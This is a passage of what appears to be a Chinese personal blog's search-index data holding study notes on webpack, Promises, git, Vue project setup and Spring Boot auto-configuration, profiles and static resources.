src=\"https://testmybuck.oss-cn-beijing.aliyuncs.com/img/image-20220210154253445.png\" alt=\"image-20220210154253445\"></h2><h2 id=\"图片导入\"><a href=\"#图片导入\" class=\"headerlink\" title=\"图片导入\"></a>图片导入</h2><p>在webpack.config.js中配置limit，如果图片大于规定的limit则需要使用file-loader，否则使用url-loader。</p>\n<p>使用图片时要使用打包后的图片，而不是初始图片</p>\n<h2 id=\"ES6转ES5\"><a href=\"#ES6转ES5\" class=\"headerlink\" title=\"ES6转ES5\"></a>ES6转ES5</h2><p>babel-loader</p>\n<p>npm install –save-dev babel-loader@7 babel-core babel-preset-es2015</p>\n<h2 id=\"脚手架2\"><a href=\"#脚手架2\" class=\"headerlink\" title=\"脚手架2\"></a>脚手架2</h2><p>目录结构</p>\n<p><img src=\"https://testmybuck.oss-cn-beijing.aliyuncs.com/img/image-20220211111909575.png\" alt=\"image-20220211111909575\"></p>\n<p>runtime-compiler与runtime-only区别</p>\n<p><img src=\"https://testmybuck.oss-cn-beijing.aliyuncs.com/img/image-20220211113110398.png\" alt=\"image-20220211113110398\"></p>\n<h2 id=\"异步处理\"><a href=\"#异步处理\" class=\"headerlink\" title=\"异步处理\"></a>异步处理</h2><ul>\n<li><p>自行封装设置flag，判断flag1&amp;&amp;flag2&amp;&amp;….是否为true</p>\n</li>\n<li><p>Promise.all()</p>\n<p>  Promise的构造函数接收一个参数，是函数，并且传入两个参数：resolve，reject，分别表示异步操作执行成功后的回调函数和异步操作执行失败后的回调函数。其实这里用“成功”和“失败”来描述并不准确，按照标准来讲，resolve是将Promise的状态置为fullfiled，reject是将Promise的状态置为rejected。</p>\n  <figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">Promise</span>.all([</span><br><span class=\"line\">    <span class=\"keyword\">new</span> <span class=\"built_in\">Promise</span>(<span class=\"function\">(<span class=\"params\">resolve,reject</span>)=&gt;</span>&#123;</span><br><span class=\"line\">        <span class=\"comment\">//业务代码       </span></span><br><span class=\"line\">    &#125;)，</span><br><span class=\"line\">    <span class=\"keyword\">new</span> <span class=\"built_in\">Promise</span>(<span class=\"function\">(<span class=\"params\">resolve,reject</span>)=&gt;</span>&#123;</span><br><span class=\"line\">        <span class=\"comment\">//业务代码       </span></span><br><span class=\"line\">    &#125;)，</span><br><span class=\"line\">    <span class=\"keyword\">new</span> <span class=\"built_in\">Promise</span>(<span class=\"function\">(<span class=\"params\">resolve,reject</span>)=&gt;</span>&#123;</span><br><span class=\"line\">        <span class=\"comment\">//业务代码       </span></span><br><span class=\"line\">    &#125;)，</span><br><span class=\"line\">      </span><br><span class=\"line\">]).then(<span class=\"function\"><span class=\"params\">results</span>=&gt;</span>&#123;</span><br><span class=\"line\">    <span class=\"comment\">//回调函数,其中results为一个数组，上面函数的返回值按顺序排列</span></span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(results)</span><br><span class=\"line\">   </span><br><span class=\"line\">&#125;)</span><br></pre></td></tr></table></figure>\n\n  <figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">let</span> flag = <span class=\"literal\">true</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> p = <span class=\"keyword\">new</span> <span class=\"built_in\">Promise</span>(<span class=\"function\">(<span class=\"params\">resolve,reject</span>)=&gt;</span>&#123;</span><br><span class=\"line\">    <span class=\"comment\">//异步代码,如下</span></span><br><span class=\"line\">    <span class=\"built_in\">setTimeout</span>(<span class=\"function\">()=&gt;</span>&#123;</span><br><span class=\"line\">       <span class=\"keyword\">if</span>(flag)&#123;</span><br><span class=\"line\">           <span class=\"comment\">//设置状态为成功</span></span><br><span class=\"line\">           resolve(<span class=\"string\">&quot;对象或者字符串&quot;</span>)</span><br><span class=\"line\">       &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">            <span class=\"comment\">//设置状态为失败\t</span></span><br><span class=\"line\">           reject(<span class=\"string\">&quot;对象或者字符串&quot;</span>)</span><br><span class=\"line\">       &#125;</span><br><span class=\"line\">    &#125;,<span class=\"number\">1000</span>)</span><br><span class=\"line\">&#125;)</span><br><span class=\"line\"><span class=\"comment\">//调用返回的成功结果或者错误结果</span></span><br><span class=\"line\">p.then(<span class=\"function\">(<span class=\"params\">res</span>)=&gt;</span>&#123;&#125;).catch(<span class=\"function\">(<span class=\"params\">err</span>)=&gt;</span>&#123;&#125;)</span><br></pre></td></tr></table></figure>\n\n<p>  <img src=\"https://testmybuck.oss-cn-beijing.aliyuncs.com/img/image-20220213205124482.png\" alt=\"image-20220213205124482\"></p>\n</li>\n<li><p>axios.all()类似与上一种</p>\n  <figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\">axios.all([axios(),axios(),axios()]).</span><br><span class=\"line\">\tthen(<span class=\"function\"><span class=\"params\">results</span>=&gt;</span>&#123;</span><br><span class=\"line\">    </span><br><span class=\"line\">\t&#125;)</span><br><span class=\"line\"><span class=\"comment\">//spread函数可以将result展开成独立的结果</span></span><br><span class=\"line\">axios.all([axios(),axios(),axios()]).</span><br><span class=\"line\">\tthen(results.spread(resp1,resp2,resp3)=&gt;&#123;</span><br><span class=\"line\">    \t</span><br><span class=\"line\">\t&#125;)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure></li>\n</ul>\n<h2 id=\"git远程仓库与本地仓库联系的方法\"><a href=\"#git远程仓库与本地仓库联系的方法\" class=\"headerlink\" title=\"git远程仓库与本地仓库联系的方法\"></a>git远程仓库与本地仓库联系的方法</h2><h3 id=\"方法一\"><a href=\"#方法一\" class=\"headerlink\" title=\"方法一\"></a>方法一</h3><ol>\n<li>git clone 远程仓库url</li>\n<li>将所要提交的东西放置到clone下的文件夹</li>\n<li>git add . 提交所有</li>\n<li>git commit -m ‘注解’</li>\n<li>git push 推送到远程仓库</li>\n</ol>\n<p>最好设置好SSH令牌</p>\n<h3 id=\"方法二\"><a href=\"#方法二\" class=\"headerlink\" title=\"方法二\"></a>方法二</h3><ol>\n<li>创建好远程仓库</li>\n<li>在写好的项目中执行git remote add origin 仓库url</li>\n<li>git push -u origin master</li>\n</ol>\n<h2 id=\"新项目\"><a href=\"#新项目\" class=\"headerlink\" title=\"新项目\"></a>新项目</h2><ol>\n<li><p>划分目录结构    </p>\n<p> <img src=\"https://testmybuck.oss-cn-beijing.aliyuncs.com/img/image-20220214205609690.png\" alt=\"image-20220214205609690\"></p>\n<ul>\n<li><p>assets: css与图片等静态资源</p>\n<ul>\n<li>base.css</li>\n<li>normalize.css</li>\n</ul>\n</li>\n<li><p>common: 公共的常量以及函数</p>\n</li>\n<li><p>component： </p>\n<pre><code>  - 多个项目可以共用的组件\n</code></pre>\n<ul>\n<li>这个项目可以共用的组件</li>\n</ul>\n</li>\n<li><p>network: 网络相关模块axios等</p>\n</li>\n<li><p>router： 前端路由配置</p>\n</li>\n<li><p>store: 未知</p>\n</li>\n<li><p>views: 由组件组成的中大组件，作为视图展示</p>\n</li>\n</ul>\n</li>\n</ol>\n<h2 id=\"vue3项目配置\"><a href=\"#vue3项目配置\" class=\"headerlink\" title=\"vue3项目配置\"></a>vue3项目配置</h2><figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">module</span>.exports = &#123;</span><br><span class=\"line\">    <span class=\"attr\">configureWebpack</span>:&#123;</span><br><span class=\"line\">        <span class=\"attr\">resolve</span>: &#123;</span><br><span class=\"line\">            <span class=\"attr\">alias</span>: &#123;</span><br><span class=\"line\">                <span class=\"comment\">//默认@为src目录</span></span><br><span class=\"line\">                <span class=\"string\">&#x27;assets&#x27;</span>: <span class=\"string\">&#x27;@/assets&#x27;</span>,</span><br><span class=\"line\">                <span class=\"string\">&#x27;common&#x27;</span>: <span class=\"string\">&#x27;@/common&#x27;</span>,</span><br><span class=\"line\">                <span class=\"string\">&#x27;components&#x27;</span>: <span class=\"string\">&#x27;@/components&#x27;</span>,</span><br><span class=\"line\">                <span class=\"string\">&#x27;network&#x27;</span>: <span class=\"string\">&#x27;@/network&#x27;</span>,</span><br><span class=\"line\">                <span class=\"string\">&#x27;views&#x27;</span>: <span class=\"string\">&#x27;@/views&#x27;</span>,</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<p>.editorconfig    配置项目的字符缩进等，规范代码</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">root = true</span><br><span class=\"line\"></span><br><span class=\"line\">[*]</span><br><span class=\"line\">charset = utf-8</span><br><span class=\"line\">indent_style = space</span><br><span class=\"line\">indent_size = 2</span><br><span class=\"line\">end_of_line = lf</span><br><span class=\"line\">insert_final_newline = true</span><br><span class=\"line\">trim_trailing_whitespace</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n","categories":["前端"],"tags":["hexo"]},{"title":"springboot初探","url":"/p/66001/","content":"<h1 id=\"微服务阶段\"><a href=\"#微服务阶段\" class=\"headerlink\" title=\"微服务阶段\"></a>微服务阶段</h1><h1 id=\"原理初探\"><a href=\"#原理初探\" class=\"headerlink\" title=\"原理初探\"></a>原理初探</h1><hr>\n<h2 id=\"自动配置\"><a href=\"#自动配置\" class=\"headerlink\" title=\"自动配置\"></a>自动配置</h2><h3 id=\"通过Confiuration与bean注解加上Condition判断各种条件是否成立，比如是否有这个类，有这个bean，没有这个bean等等实现\"><a href=\"#通过Confiuration与bean注解加上Condition判断各种条件是否成立，比如是否有这个类，有这个bean，没有这个bean等等实现\" class=\"headerlink\" title=\"通过Confiuration与bean注解加上Condition判断各种条件是否成立，比如是否有这个类，有这个bean，没有这个bean等等实现\"></a>通过Confiuration与bean注解加上Condition判断各种条件是否成立，比如是否有这个类，有这个bean，没有这个bean等等实现</h3><p>pom.xml</p>\n<ul>\n<li>spring-boot-dependencies： 核心依赖在在父工程中</li>\n<li>我们在引入Springboot依赖时不需要标注版本，因为有这些版本仓库</li>\n</ul>\n<p>启动器</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">dependency</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">groupId</span>&gt;</span>org.springframework.boot<span class=\"tag\">&lt;/<span class=\"name\">groupId</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">artifactId</span>&gt;</span>spring-boot-starter<span class=\"tag\">&lt;/<span class=\"name\">artifactId</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<ul>\n<li><p>说白了就是Springboot的启动场景；</p>\n</li>\n<li><p>比如spring-boot-starter-web，他就会帮我们自动导入web环境所有的依赖</p>\n</li>\n<li><p>springboot会将所有的功能场景都变成一个个的启动器</p>\n</li>\n<li><p>我们要使用什么功能，就只需要找到对应的启动器就可以了<code>starter</code></p>\n</li>\n</ul>\n<p>主程序</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//标注这个类是Springboot的应用</span></span><br><span class=\"line\"><span class=\"meta\">@SpringBootApplication</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Springboot01HellworldApplication</span> </span>&#123;</span><br><span class=\"line\"><span class=\"comment\">//将Springboot应用启动\t</span></span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> </span>&#123;</span><br><span class=\"line\">\t\tSpringApplication.run(Springboot01HellworldApplication.class, args);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<ul>\n<li><p>注解</p>\n<ul>\n<li>```java<br>@SpringBootConfiguration Springboot的配置<pre><code>@Configuration： Spring的配置类\n@Componrnt： 说明这也是spring的组件\n</code></pre>\n@EnableAutoConfiguration ： 自动配置<pre><code>@AutoConfiguration：自动配置包\n    @Import(AutoConfigurationPackages.Registrar.class): 自动配置`包注册`\n@Import(AutoConfigurationImportSelector.class): 自动配置导入选择\n</code></pre>\nList<String> configurations = getCandidateConfigurations(annotationMetadata,attributes);<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">- 获取候选的配置</span><br><span class=\"line\"></span><br><span class=\"line\">  ```java</span><br><span class=\"line\">  \tprotected List&lt;String&gt; getCandidateConfigurations(AnnotationMetadata metadata, AnnotationAttributes attributes) &#123;</span><br><span class=\"line\">  \t\tList&lt;String&gt; configurations = SpringFactoriesLoader.loadFactoryNames(getSpringFactoriesLoaderFactoryClass(),</span><br><span class=\"line\">  \t\t\t\tgetBeanClassLoader());</span><br><span class=\"line\">  \t\tAssert.notEmpty(configurations, &quot;No auto configuration classes found in META-INF/spring.factories. If you &quot;</span><br><span class=\"line\">  \t\t\t\t+ &quot;are using a custom packaging, make sure that file is correct.&quot;);</span><br><span class=\"line\">  \t\treturn configurations;</span><br><span class=\"line\">  \t&#125;</span><br></pre></td></tr></table></figure></li>\n</ul>\n</li>\n</ul>\n<p>META-INF/spring-factories: 自动配置的核心文件</p>\n<p><img src=\"https://testmybuck.oss-cn-beijing.aliyuncs.com/img/image-20220117190206084.png\" alt=\"image-20220117190206084\"></p>\n<p>spring-factories下的webmvc的自动配置文件</p>\n<p><img src=\"C:\\Users\\86188\\AppData\\Roaming\\Typora\\typora-user-images\\image-20220117190308084.png\" alt=\"image-20220117190308084\"></p>\n<p>结论：springboot所有的自动配置都是在启动的时候扫描并加载：spring.factories所有的自动配置类都在这里面，但是不一定生效，要判断条件是否成立，只要导入了对应的start，就有对应的启动器了，有了启动器，我们自动装配就会生效，然后配置成功<img src=\"https://testmybuck.oss-cn-beijing.aliyuncs.com/img/SpringBoot.png\" alt=\"SpringBoot\"></p>\n<ol>\n<li>SpringBoot在启动的时候从类路径下的META-INF/spring.factories中获取EnableAutoConfiguration指定的值</li>\n<li>将这些值作为自动配置类导入容器，自动配置类就生效，帮我们进行自动配置工作;</li>\n<li>以前我们需要自己配置的东西，自动配置类都帮我们解决了</li>\n<li>整个J2EE的整体解决方案和自动配置都在springboot-autoconfigure的jar包中;</li>\n<li>它将所有需要导入的组件以全类名的方式返回， 这些组件就会被添加到容器中；</li>\n<li>它会给容器中导入非常多的自动配置类（xxxAutoConfiguration），就是给容器中导入这个场景需要的所有组件， 并配置好这些组件；</li>\n<li>有了自动配置类， 免去了我们手动编写配置注入功能组件等的工作；</li>\n</ol>\n<p>自动配置主线流程</p>\n<p><img src=\"https://testmybuck.oss-cn-beijing.aliyuncs.com/img/%E6%8A%80%E8%83%BD%E6%A0%91.png\" alt=\"技能树\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">@SpringBootApplication-&gt;@SpringBootConfiguration（自定义注解，标注设置生成bean的类）</span><br><span class=\"line\">\t\t\t\t\t  -&gt;(主线)@EnableAutoConfiguration-----&gt;</span><br><span class=\"line\">\t\t\t\t\t \t\t\t\t\t\t\t\t  ----&gt;</span><br><span class=\"line\">\t\t\t\t\t  -&gt;@ComponentScan(扫描包)</span><br></pre></td></tr></table></figure>\n\n\n\n\n\n<h3 id=\"import的四种用法\"><a href=\"#import的四种用法\" class=\"headerlink\" title=\"import的四种用法\"></a>import的四种用法</h3><ol>\n<li>导入需要的bean类对象  @import(User.class)</li>\n<li>导入含有所需要bean的生成方法的配置文件  @import(UserConfig.class)</li>\n<li>导入ImportSelector的实现类，这个实现类需要实现一个返回bean全限定名的一个String集合的方法。也就是说可以通过配置文件注入实现动态加载  @import(MyImportSelector.class) </li>\n<li>导入ImportBeanDefinitionRegistrar的实现类，也是需要实现一个方法。设置需要的bean。</li>\n</ol>\n<p>​          @Import(MyImportBeanDefinitionRegistrar.class)</p>\n<h2 id=\"run方法执行流程\"><a href=\"#run方法执行流程\" class=\"headerlink\" title=\"run方法执行流程\"></a>run方法执行流程</h2><p>1.推断应用的类型是普通的项目还是WEB项目</p>\n<p>2.查找并加载所有可用初始化器，设置initailizers属性中</p>\n<p>3.找出所有的应用程序监听器，设置到listeners属性中</p>\n<p>4.腿短并设置main方法的定义类，找到运行的主类</p>\n<h2 id=\"配置文件\"><a href=\"#配置文件\" class=\"headerlink\" title=\"配置文件\"></a>配置文件</h2><p>配置文件能写什么</p>\n<p>spring.factories中能配置的在配置文件中都可以配置</p>\n<p>在springboot中,配置文件可以是properties,yaml,yml三个格式中的任意一个,其中properties是键值对形式的,yaml和yml其实是同一种格式,只是后缀名不同而已。</p>\n<p>当三种文件同时存在时,其实三个文件中的配置信息都会生效，但是当三个文件中有配置信息冲突时,优先级是:properties&gt;yaml&gt;yml, 也就是properties里配置的内容会覆盖另外两个的配置。</p>\n<p>至于原因可以在spring-boot-starter-parent里找到，</p>\n<p><img src=\"https://testmybuck.oss-cn-beijing.aliyuncs.com/img/image-20220117205558048.png\" alt=\"image-20220117205558048\"></p>\n<p>这里的逻辑顺序是先加载yml再加载yaml再加properties,后加载的自然会把先加载的数据给覆盖掉.</p>\n<h3 id=\"配置文件注入\"><a href=\"#配置文件注入\" class=\"headerlink\" title=\"配置文件注入\"></a>配置文件注入</h3><h4 id=\"第一种方法\"><a href=\"#第一种方法\" class=\"headerlink\" title=\"第一种方法\"></a>第一种方法</h4><p><strong>导入</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;dependency&gt;</span><br><span class=\"line\">    &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;</span><br><span class=\"line\">    &lt;artifactId&gt;spring-boot-configuration-processor&lt;/artifactId&gt;</span><br><span class=\"line\">&lt;/dependency&gt; </span><br></pre></td></tr></table></figure>\n\n<p><strong>@Component+@ConfigurationProperties(prefix)+yaml编写</strong></p>\n<p>yaml可以给实体类赋值</p>\n<p><img src=\"https://testmybuck.oss-cn-beijing.aliyuncs.com/img/image-20220117223201633.png\" alt=\"image-20220117223201633\"></p>\n<p>@ConfigurationProperties作用:<br>将配置文件中配置的每一个属性的值映射到这个组件中<br>告诉SpringBoot将奔雷中的所有属性和配置文件中的相关配置进行绑定<br>参数prefix=”person”: 将配置文件中的person下面的所有属性一一对应</p>\n<p>只有这个组件是容器中的组件,才能使用容器提供的@ConfigurationProperties功能</p>\n<h4 id=\"第二种方法\"><a href=\"#第二种方法\" class=\"headerlink\" title=\"第二种方法\"></a>第二种方法</h4><p>编写好配置文件后</p>\n<p>@PropertySource(value = “classpath:gxy.properties”)</p>\n<p>@Value(“${name}”)</p>\n<p>两种方法比较（推荐使用第一种）</p>\n<p><img src=\"https://testmybuck.oss-cn-beijing.aliyuncs.com/img/image-20220118085437967.png\" alt=\"image-20220118085437967\"></p>\n<h2 id=\"JSR303校验（-Validated-数据校验）\"><a href=\"#JSR303校验（-Validated-数据校验）\" class=\"headerlink\" title=\"JSR303校验（@Validated 数据校验）\"></a>JSR303校验（@Validated 数据校验）</h2><p>导入依赖</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">dependency</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">groupId</span>&gt;</span>org.springframework.boot<span class=\"tag\">&lt;/<span class=\"name\">groupId</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">artifactId</span>&gt;</span>spring-boot-starter-validation<span class=\"tag\">&lt;/<span class=\"name\">artifactId</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>在对应属性上写@Email(message=“报错信息”)…其他注解如下</p>\n<p><img src=\"https://testmybuck.oss-cn-beijing.aliyuncs.com/img/image-20220118091926030.png\" alt=\"image-20220118091926030\"></p>\n<p><img src=\"https://testmybuck.oss-cn-beijing.aliyuncs.com/img/image-20220118091637754.png\" alt=\"image-20220118091637754\"></p>\n<h2 id=\"配置文件优先级\"><a href=\"#配置文件优先级\" class=\"headerlink\" title=\"配置文件优先级\"></a>配置文件优先级</h2><p>配置文件可以在四个文件夹中存在,冲突时优先级自上而下降低</p>\n<p> ./config/application.yaml    </p>\n<p>./application.yaml    </p>\n<p>./src/main/resource/config/application.yaml</p>\n<p>./src/main/resource/application.yaml   </p>\n<h2 id=\"springboot的多环境切换\"><a href=\"#springboot的多环境切换\" class=\"headerlink\" title=\"springboot的多环境切换\"></a>springboot的多环境切换</h2><h4 id=\"1-方法一：通过配置文件\"><a href=\"#1-方法一：通过配置文件\" class=\"headerlink\" title=\"1.方法一：通过配置文件\"></a>1.方法一：通过配置文件</h4><p>application-dev.properties</p>\n<p>application-test.properties</p>\n<p>application-xxx.properties</p>\n<p>application.properties</p>\n<p>通过在主配置文件中application.properties增加spring.profiles.active=dev  (或者其他后面几个字如test、xxx)</p>\n<p>记住properties能覆盖冲突域</p>\n<p>或者使用yml    极其方便，一个顶三</p>\n<figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">server:</span></span><br><span class=\"line\">  <span class=\"attr\">port:</span> <span class=\"number\">8083</span></span><br><span class=\"line\"><span class=\"attr\">spring:</span></span><br><span class=\"line\">  <span class=\"attr\">profiles:</span></span><br><span class=\"line\">    <span class=\"attr\">active:</span> <span class=\"string\">test</span></span><br><span class=\"line\"><span class=\"meta\">---</span></span><br><span class=\"line\"><span class=\"attr\">server:</span></span><br><span class=\"line\">  <span class=\"attr\">port:</span> <span class=\"number\">8084</span></span><br><span class=\"line\"><span class=\"attr\">spring:</span></span><br><span class=\"line\">  <span class=\"attr\">profles:</span> <span class=\"string\">dev</span></span><br><span class=\"line\"><span class=\"meta\">---</span></span><br><span class=\"line\"><span class=\"attr\">server:</span></span><br><span class=\"line\">  <span class=\"attr\">port:</span> <span class=\"number\">8085</span></span><br><span class=\"line\"><span class=\"attr\">spring:</span></span><br><span class=\"line\">  <span class=\"attr\">profiles:</span> <span class=\"string\">test</span></span><br></pre></td></tr></table></figure>\n\n<h4 id=\"2-通过IDEA虚拟机参数-Dspring-profiles-active-环境名\"><a href=\"#2-通过IDEA虚拟机参数-Dspring-profiles-active-环境名\" class=\"headerlink\" title=\"2.通过IDEA虚拟机参数  -Dspring.profiles.active=环境名\"></a>2.通过IDEA虚拟机参数  -Dspring.profiles.active=环境名</h4><h4 id=\"3-通过Program-arguments-–spring-profiles-active-环境名\"><a href=\"#3-通过Program-arguments-–spring-profiles-active-环境名\" class=\"headerlink\" title=\"3.通过Program arguments –spring.profiles.active=环境名\"></a>3.通过Program arguments –spring.profiles.active=环境名</h4><p>自动配置实例</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//表示这是一个配置类</span></span><br><span class=\"line\"><span class=\"meta\">@Configuration(proxyBeanMethods = false)</span></span><br><span class=\"line\"><span class=\"comment\">//自动配置属性</span></span><br><span class=\"line\"><span class=\"meta\">@EnableConfigurationProperties(ServerProperties.class)</span></span><br><span class=\"line\"><span class=\"comment\">//spring的底层注解：根据条件判断是否生效</span></span><br><span class=\"line\"><span class=\"meta\">@ConditionalOnWebApplication(type = ConditionalOnWebApplication.Type.SERVLET)</span></span><br><span class=\"line\"><span class=\"meta\">@ConditionalOnClass(CharacterEncodingFilter.class)</span></span><br><span class=\"line\"><span class=\"meta\">@ConditionalOnProperty(prefix = &quot;server.servlet.encoding&quot;, value = &quot;enabled&quot;, matchIfMissing = true)</span></span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"自动装配的精髓\"><a href=\"#自动装配的精髓\" class=\"headerlink\" title=\"自动装配的精髓\"></a>自动装配的精髓</h2><p>1）SpringBoot启动会加载大量的自动配置类<br>2）我们看我们需要的功能有没有在SpringBoot默认写好的自动配置类当中;<br>3）我们再来看这个自动配置类中到底配置了哪些组件;(只要我们要用的组件存在在其中，我们就不需要再手动配置了）<br>4）给容器中自动配置类添加组件的时候，会从properties类中获取某些属性。我们只要在配置文件中指定这些属性的值即可;<br>xxxxAutoConfigurartion：自动配置类；给容器中添加组件<br>xxxxProperties:封装配置文件中相关属性;</p>\n<h2 id=\"debug-true调试判断是否生效\"><a href=\"#debug-true调试判断是否生效\" class=\"headerlink\" title=\"debug=true调试判断是否生效\"></a>debug=true调试判断是否生效</h2><p>Positive matches:  已经生效的类</p>\n<p>Negative matches: 没有生效的类</p>\n<p>Exclusions: 排除的类（运行前已经不给用）</p>\n<p>Unconditional classes: 没有条件</p>\n<h1 id=\"Springboot-Web网站开发\"><a href=\"#Springboot-Web网站开发\" class=\"headerlink\" title=\"Springboot Web网站开发\"></a>Springboot Web网站开发</h1><p>jar:webapp!</p>\n<p>自动装配</p>\n<p>springboot到底帮我们配置了什么？我们能不能修改？能修改哪些东西？能不能拓展</p>\n<ul>\n<li>xxxxAutoConfiguration 向容器中自动配置组件</li>\n<li>xxxProperties：自动配置类，装配配置文件中自定义的一些内容</li>\n</ul>\n<p>要解决的问题</p>\n<ul>\n<li>导入静态资源</li>\n<li>首页问题</li>\n<li>模板引擎</li>\n<li>装配扩展SpringMVC</li>\n<li>增删改查</li>\n<li>拦截器</li>\n<li>国际化</li>\n</ul>\n<h2 id=\"静态资源\"><a href=\"#静态资源\" class=\"headerlink\" title=\"静态资源\"></a>静态资源</h2><p>webmvcautoconfiguration-&gt;adapter-&gt;addresourcehandlers</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">addResourceHandlers</span><span class=\"params\">(ResourceHandlerRegistry registry)</span> </span>&#123;</span><br><span class=\"line\">   <span class=\"keyword\">if</span> (!<span class=\"keyword\">this</span>.resourceProperties.isAddMappings()) &#123;</span><br><span class=\"line\">      logger.debug(<span class=\"string\">&quot;Default resource handling disabled&quot;</span>);</span><br><span class=\"line\">      <span class=\"keyword\">return</span>;</span><br><span class=\"line\">   &#125;</span><br><span class=\"line\">   Duration cachePeriod = <span class=\"keyword\">this</span>.resourceProperties.getCache().getPeriod();</span><br><span class=\"line\">   CacheControl cacheControl = <span class=\"keyword\">this</span>.resourceProperties.getCache().getCachecontrol().toHttpCacheControl();</span><br><span class=\"line\">    <span class=\"comment\">//1.第一种方法   如果有webjar就去找webjar目录下的东西</span></span><br><span class=\"line\">   <span class=\"keyword\">if</span> (!registry.hasMappingForPattern(<span class=\"string\">&quot;/webjars/**&quot;</span>)) &#123;</span><br><span class=\"line\">      customizeResourceHandlerRegistration(registry.addResourceHandler(<span class=\"string\">&quot;/webjars/**&quot;</span>)</span><br><span class=\"line\">            .addResourceLocations(<span class=\"string\">&quot;classpath:/META-INF/resources/webjars/&quot;</span>)</span><br><span class=\"line\">            .setCachePeriod(getSeconds(cachePeriod)).setCacheControl(cacheControl));</span><br><span class=\"line\">   &#125;</span><br><span class=\"line\">   <span class=\"comment\">//第二种方法     </span></span><br><span class=\"line\">   String staticPathPattern = <span class=\"keyword\">this</span>.mvcProperties.getStaticPathPattern();</span><br><span class=\"line\">   <span class=\"keyword\">if</span> (!registry.hasMappingForPattern(staticPathPattern)) &#123;</span><br><span class=\"line\">      customizeResourceHandlerRegistration(registry.addResourceHandler(staticPathPattern)</span><br><span class=\"line\">            .addResourceLocations(getResourceLocations(<span class=\"keyword\">this</span>.resourceProperties.getStaticLocations()))</span><br><span class=\"line\">            .setCachePeriod(getSeconds(cachePeriod)).setCacheControl(cacheControl));</span><br><span class=\"line\">   &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>maven导入的包会格式化为规则的目录结构</p>\n<ul>\n<li>第一种方法webjars，</li>\n</ul>\n<p>springboot会将webjars目录映射到META-INF/resource/webjars目录，根据相对路径直接写所需要文件即可</p>\n<ul>\n<li>第二种方法</li>\n</ul>\n<p>直接访问根目录/，根目录下所有对静态资源的请求会在一下目录寻找</p>\n<p>/**</p>\n<p>classpath:/META-INF/resources/</p>\n<p>classpath:/resources/ </p>\n<p>classpath:/static/</p>\n<p>classpath:/public/</p>\n<p>都可以访问到冲突时resources&gt;static&gt;public </p>\n<p>也就是说</p>\n<p><code>localhost:8080/webjars</code></p>\n<p><code>localhost:8080/</code></p>\n<p>两种方法,第一种用的少</p>\n<h2 id=\"首页配置\"><a href=\"#首页配置\" class=\"headerlink\" title=\"首页配置\"></a>首页配置</h2><p>templates目录下所有页面只能通过Controller跳转，相当于WEB-INF目录</p>\n<p>所有页面的静态资源都需要thymeleaf接管</p>\n<p>导入命名空间  <code>xmlns:th=&quot;http://www.thymeleaf.org&quot;</code></p>\n<p>th:href=@{} 接管本地超链接</p>\n<h2 id=\"模板引擎\"><a href=\"#模板引擎\" class=\"headerlink\" title=\"模板引擎\"></a>模板引擎</h2><p>将html放在template目录下,默认解析</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">final</span> String DEFAULT_PREFIX = <span class=\"string\">&quot;classpath:/templates/&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span 